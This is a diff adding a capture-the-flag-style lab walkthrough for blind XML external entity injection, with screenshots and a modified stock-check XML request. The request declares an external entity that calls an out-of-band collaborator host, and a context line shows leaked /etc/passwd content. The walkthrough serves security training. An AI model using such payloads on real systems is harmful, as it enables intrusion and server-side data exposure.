@@ -440,7 +440,46 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 
 
 
+<details>
+     <summary>Lab: Blind XXE with out-of-band interaction</summary>
 
+
+
+1. navigate products and choose one of them then cick **`check stock`**
+
+<img width="921" height="581" alt="image" src="https://github.com/user-attachments/assets/f6fc78c2-2aae-414a-8258-7549344143ae" />
+
+2. we find this `XML`
+
+```html
+<?xml version="1.0" encoding="UTF-8"?>
+  <stockCheck>
+     <productId>2</productId>
+     <storeId>1</storeId>
+  </stockCheck>
+```
+
+<img width="1411" height="786" alt="image" src="https://github.com/user-attachments/assets/14875164-d4d9-4b66-ae80-c196e1b9cc98" />
+
+3. eidt request to to out of band xml 
+
+```html
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
+  <stockCheck>
+     <productId>&xxe;</productId>
+     <storeId>1</storeId>
+  </stockCheck>
+```
+
+
+<img width="1512" height="651" alt="image" src="https://github.com/user-attachments/assets/d60aec77-56b8-48b1-bf64-722791c23bfc" />
+
+
+
+
+     
+</details>
 
 
 
